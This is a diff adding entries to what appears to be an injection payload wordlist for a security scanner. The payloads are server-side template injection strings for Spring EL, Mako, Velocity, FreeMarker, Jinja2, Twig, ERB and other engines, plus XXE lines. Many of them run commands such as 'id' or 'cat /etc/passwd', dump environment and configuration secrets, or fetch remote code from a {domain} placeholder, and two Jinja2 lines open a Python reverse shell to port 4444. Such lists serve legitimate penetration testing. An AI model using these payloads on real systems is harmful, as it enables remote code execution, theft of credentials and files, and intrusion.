@@ -1059,6 +1059,66 @@ T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec
 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")').getInputStream())
 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"').getInputStream())
 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())
+${T(java.lang.Runtime).getRuntime().exec('cat etc\/passwd')}
+${T(java.lang.System).getenv()}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system(\"id\")}
+${donotexists|1337*1337}
+${self.__init__.__globals__['util'].os.system('id')}
+${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\"id\")}
+${self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")}
+${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\"id\")}
+${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\"id\")}
+${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\"id\")}
+${self.attr._NSAttr__parent.module.runtime.util.os.system(\"id\")}
+${self.attr._NSAttr__parent.template.module.cache.util.os.system(\"id\")}
+${self.attr._NSAttr__parent.template.module.runtime.util.os.system(\"id\")}
+${self.context._with_template._mmarker.module.cache.util.os.system(\"id\")}
+${self.context._with_template._mmarker.module.runtime.util.os.system(\"id\")}
+${self.context._with_template.module.cache.compat.inspect.os.system(\"id\")}
+${self.context._with_template.module.cache.util.os.system(\"id\")}
+${self.context._with_template.module.filters.compat.inspect.os.system(\"id\")}
+${self.context._with_template.module.runtime.compat.inspect.os.system(\"id\")}
+${self.context._with_template.module.runtime.exceptions.util.os.system(\"id\")}
+${self.context._with_template.module.runtime.util.os.system(\"id\")}
+${self.module.cache.compat.inspect.linecache.os.system(\"id\")}
+${self.module.cache.compat.inspect.os.system(\"id\")}
+${self.module.cache.util.compat.inspect.linecache.os.system(\"id\")}
+${self.module.cache.util.compat.inspect.os.system(\"id\")}
+${self.module.filters.compat.inspect.linecache.os.system(\"id\")}
+${self.module.filters.compat.inspect.os.system(\"id\")}
+${self.module.runtime.compat.inspect.linecache.os.system(\"id\")}
+${self.module.runtime.compat.inspect.os.system(\"id\")}
+${self.module.runtime.exceptions.compat.inspect.linecache.os.system(\"id\")}
+${self.module.runtime.exceptions.compat.inspect.os.system(\"id\")}
+${self.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}
+${self.module.runtime.exceptions.util.compat.inspect.os.system(\"id\")}
+${self.module.runtime.exceptions.util.os.system(\"id\")}
+${self.module.runtime.util.compat.inspect.linecache.os.system(\"id\")}
+${self.module.runtime.util.compat.inspect.os.system(\"id\")}
+${self.module.runtime.util.os.system(\"id\")}
+${self.template.__init__.__globals__['os'].system('id')}
+${self.template._mmarker.module.cache.compat.inspect.os.system(\"id\")}
+${self.template._mmarker.module.cache.util.os.system(\"id\")}
+${self.template._mmarker.module.filters.compat.inspect.os.system(\"id\")}
+${self.template._mmarker.module.runtime.compat.inspect.os.system(\"id\")}
+${self.template._mmarker.module.runtime.exceptions.util.os.system(\"id\")}
+${self.template._mmarker.module.runtime.util.os.system(\"id\")}
+${self.template.module.cache.compat.inspect.linecache.os.system(\"id\")}
+${self.template.module.cache.compat.inspect.os.system(\"id\")}
+${self.template.module.cache.util.compat.inspect.os.system(\"id\")}
+${self.template.module.cache.util.os.system(\"id\")}
+${self.template.module.filters.compat.inspect.linecache.os.system(\"id\")}
+${self.template.module.filters.compat.inspect.os.system(\"id\")}
+${self.template.module.runtime.compat.inspect.linecache.os.system(\"id\")}
+${self.template.module.runtime.compat.inspect.os.system(\"id\")}
+${self.template.module.runtime.exceptions.compat.inspect.os.system(\"id\")}
+${self.template.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}
+${self.template.module.runtime.exceptions.util.os.system(\"id\")}
+${self.template.module.runtime.util.compat.inspect.os.system(\"id\")}
+${self.template.module.runtime.util.os.system(\"id\")}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}
 java.lang.Runtime.exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\");
 java.lang.Runtime.exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\");
 java.lang.Runtime.exec('certutil -urlcache -f \"http:\/\/{domain}\"');
@@ -1073,6 +1133,37 @@ java.lang.Runtime.exec('sleep 9');
 }#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}#{
 }${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}${
 }${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}${
+$context.identity.accountId
+$context.arguments
+$context.identity
+$context.result
+$context.info.variables
+$context.request.headers
+${math:floor(1337*1337)}
+${math:max(1, 1787569)}
+${#set($x = 1337) $x * 1337}
+#set(x=1337*1337){x}
+#set(x=1337+1337){x}
+#set ($run=1337 + 1337) $run 
+#set( $bar = 'foo' ) $bar
+#{set} ($run=1337 + 1337) $run
+$response.sendRedirect(\"http:\/\/{domain}\")
+$response.sendRedirect(\"https:\/\/{domain}\")
+${response.sendRedirect('http:\/\/{domain}')}
+${response.sendRedirect('https:\/\/{domain}')}
+#set($xss = '<script>alert(1);<\/script>') $xss
+#set($run = ['<','s','c','r','i','p','t','>','alert(1);','<','\/','s','c','r','i','p','t','>']) #foreach($key in $run)$key#end
+#evaluate($import.read('http:\/\/{domain}'))
+${http.getClient().get('http:\/\/{domain}')}
+${http.getClient().get('https:\/\/{domain}')}
+#set($str=$class.inspect(\"java.lang.String\").type)
+#set($chr=$class.inspect(\"java.lang.Character\").type)
+#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end
 $HOME
 $ENV{'HOME'}
 %d
@@ -1087,6 +1178,8 @@ $ENV{'HOME'}
 ${{<%[%'\"}}%\\
 {% debug %}
 {{settings.SECRET_KEY}}
+{{=1337*1337}}
+{#1337*1337}or{1337*1337}or{@1337*1337}
 {{7*'7'}}
 {{7*7}}
 ${{7*7}}
@@ -1126,6 +1219,55 @@ ${\"freemarker.template.utility.Execute\"?new()(\"certutil -urlcache -f 'http:\/
 ${\"freemarker.template.utility.Execute\"?new()(\"exec 6< \/dev\/tcp\/{domain}\/80\")}
 ${\"freemarker.template.utility.Execute\"?new()(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")}
 ${\"freemarker.template.utility.Execute\"?new()(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")}
+<%= 1337 * 1337 %>
+<%= 1337*1337 %>
+<%= File.open('\/etc\/passwd').read %>
+<%=1337*1337 %>
+@(1337*1337)
+@(1337*1337)
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+[1337*1337]
+[[${1337*1337}]]
+{$smarty.version}
+{% for key, value in config.iteritems() %}<dt>{{ key|e }}<\/dt><dd>{{ value|e }}<\/dd>{% endfor %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"\/bin\/cat\\\", \\\"\/etc\/passwd\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"\/bin\/cat\\\", \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('\/etc\/passwd').read() }}
+{{ [].class.base.subclasses() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"\/etc\/passwd\").read() }}
+{{ request }}
+{{''.__class__.__base__.__subclasses__()[227]('cat \/etc\/passwd', shell=True, stdout=-1).communicate()}}
+{{''.__class__.mro()[1].__subclasses__()[396]('cat \/etc\/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.class.mro()[1].subclasses()}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}}
+{{'hacked'.toUpperCase()}}
+{{2*2}}[[1337*1337]]
+{['cat$IFS\/etc\/passwd']|filter('system')}}
+{{['cat\\x20\/etc\/passwd']|filter('system')}}
+{{['id']|filter('system')}}
+{{app.request.query.filter(0,0,1024,{'options':'system'})}}
+{{app.request.server.all|join(',')}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{{config.items()}}
+{{cycler.__init__.__globals__.os}}
+{{dump(app)}}
+{{joiner.__init__.__globals__.os}}
+{{namespace.__init__.__globals__.os}}
+{{request.__class__}}
+{{request|attr(\"__class__\")}}
+{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}
+{{request|attr([\"__\",\"class\",\"__\"]|join)}}
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
+{{self._TemplateReference__context.joiner.__init__.__globals__.os}}
+{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
 <!DOCTYPE example [<!ENTITY xxe SYSTEM \"file:\/\/\/etc\/passwd\">]><root>&xxe;<\/root>
 %3C%21DOCTYPE%20example%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
 <!DOCTYPE example [<!ENTITY xxe SYSTEM \"http:\/\/{domain}\">]><root>&xxe;<\/root>
